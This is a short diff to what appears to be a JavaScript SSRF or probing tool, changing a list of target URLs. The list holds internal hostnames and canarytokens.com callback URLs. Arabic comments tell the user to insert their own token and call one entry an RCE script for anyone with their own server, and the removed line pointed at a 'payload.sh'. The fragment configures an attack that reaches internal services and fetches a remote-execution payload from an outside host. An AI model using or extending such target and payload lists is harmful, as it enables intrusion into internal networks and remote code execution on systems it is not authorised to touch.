@@ -14,8 +14,8 @@ const TARGET_URLS = [
   'http://internal/',
   'http://internal.website/',
   'http://docker.for.mac.localhost/',
-  'http://canarytokens.com/articles/YOUR-TOKEN/contact.php',  // ضع التوكن الخاص بك
-  'http://canarytokens.com/articles/qczfimih1tdawvj4ijjldi9fp/payload.sh' // سكربت RCE لو عندك سيرفر خاص
+  'http://canarytokens.com/images/about/p0kby1ermspaxxc25icmq89af/submit.aspx',  // ضع التوكن الخاص بك
+  'http://canarytokens.com/images/about/p0kby1ermspaxxc25icmq89af/submit.aspx' // سكربت RCE لو عندك سيرفر خاص
 ];
 
 const METHODS = ['GET', 'POST', 'HEAD'];
